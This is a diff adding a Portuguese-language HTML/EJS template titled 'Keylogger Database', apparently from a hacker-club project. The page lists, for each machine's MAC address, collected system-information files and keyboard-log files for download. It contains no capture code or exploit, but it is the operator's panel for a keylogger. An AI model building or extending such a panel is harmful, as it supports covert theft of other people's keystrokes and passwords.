@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    <link rel="icon" href="../images/keyboard.png"> 
+    <title>Keylogged</title>
+
+  </head>
+
+  <body class="d-flex flex-column min-vh-100 bg-dark text-white">
+    <header>
+      <nav class="navbar navbar-dark bg-dark shadow">
+        <a class="navbar-brand" href="/index">
+            <img src="../images/logohackoonspace.png" width="30" height="30" class="d-inline-block align-top" alt="" loading="lazy">
+            Keylogger Database
+        </a>
+        <form class="form-inline">
+          <input readonly class="form-control mr-sm-2 bg-dark text-white-50 border border-info" type="search" id="inputData" placeholder="Buscar" aria-label="Buscar">
+          <input class="btn btn-info my-2 my-sm-0 disabled" type="button" id="searchBtn" value="Buscar">
+        </form>
+      </nav>
+    </header>
+
+    <main role="main" class="container">
+      <div class="container text-center mt-5"> 
+
+        <!-- input -->
+        <h1 class="user-select-none" id="userMacAdreess"> <%=mac%> </h1> 
+
+        <div class="accordion mt-4 bg-dark" id="userAccordion">
+          <div class="card border-info">
+            <div class="card-header bg-dark" id="userSystemInfo">
+              <h2 class="mb-0">
+                <input class="btn btn-block text-left text-info collapsed" type="button" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne" value="Informações do Sistema">
+              </h2>
+            </div>                  
+            <div id="collapseOne" class="collapse" aria-labelledby="userSystemInfo">
+              <div class="card-body bg-dark text-left">
+                <div class="container">
+                  <%for(item of sys) {%>
+                    <%if(item.type == '-') {%>
+                      <form action="/download" method="POST" target="_blank">
+                        <input type="hidden" name="filename" value="<%=item.name%>">
+                        <input type="hidden" name="mac_address" value="<%=mac%>">
+
+                        <div class="row rounded mb-2 py-2" style="background-color: #31373C;">
+                          <div class="col-11">
+                            <button type="submit" class="btn text-white float-left">
+                              <i class="fas fa-file-alt w3-large"></i>
+                            </button>
+                            <input class="btn w-75 text-white font-weight-bold text-left user-select-none float-left" style="cursor: default;" value="<%=item.name%>" readonly>
+                          </div>
+                          <div class="col-1">
+                            <button type="submit" class="btn text-white mr-3">
+                              <i class="fas fa-cloud-download-alt w3-large"></i>
+                            </button>
+                          </div>
+                        </div>
+                      </form>
+                    <%}%>
+                  <%}%>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="card border-info">
+            <div class="card-header bg-dark" id="userKeyloggers">
+              <h2 class="mb-0">
+                <input class="btn btn-block text-left text-info collapsed" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo" value="Registros do teclado">
+              </h2>
+            </div>
+            <div id="collapseTwo" class="collapse" aria-labelledby="userKeyloggers">
+              <div class="card-body bg-dark text-left">
+                <div class="container">
+                  <%for(item of log) {%>
+                    <%if(item.type == '-') {%>
+                      <form action="/download" method="POST" target="_blank">
+                        <input type="hidden" name="filename" value="<%=item.name%>">
+                        <input type="hidden" name="mac_address" value="<%=mac%>">
+
+                        <div class="row rounded mb-2 py-2" style="background-color: #31373C;">
+                          <div class="col-11">
+                            <button type="submit" class="btn text-white float-left">
+                              <i class="fas fa-file-alt w3-large"></i>
+                            </button>
+                            <input class="btn w-75 text-white font-weight-bold text-left user-select-none float-left" style="cursor: default;" value="<%=item.name%>" readonly>
+                          </div>
+                          <div class="col-1">
+                            <button type="submit" class="btn text-white mr-3">
+                              <i class="fas fa-cloud-download-alt w3-large"></i>
+                            </button>
+                          </div>
+                        </div>
+                      </form>
+                    <%}%>
+                  <%}%>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer mt-auto"> 
+      <div class="container">
+        <div class="footer-copyright text-center py-3 text-muted"> Todos direitos reservados © <a href="https://hackoonspace.com/" class="text-info">Hackoonspace</a> <a href="https://github.com/cavebran" class="text-muted">@cavebran</a> e <a href="https://github.com/luccamapt" class="text-muted">@luccamapt</a>.</div>
+      </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/905999ff68.js" crossorigin="anonymous"></script>
+
+    <script src="vrtxkl.js"></script>
+  </body>
+</html>
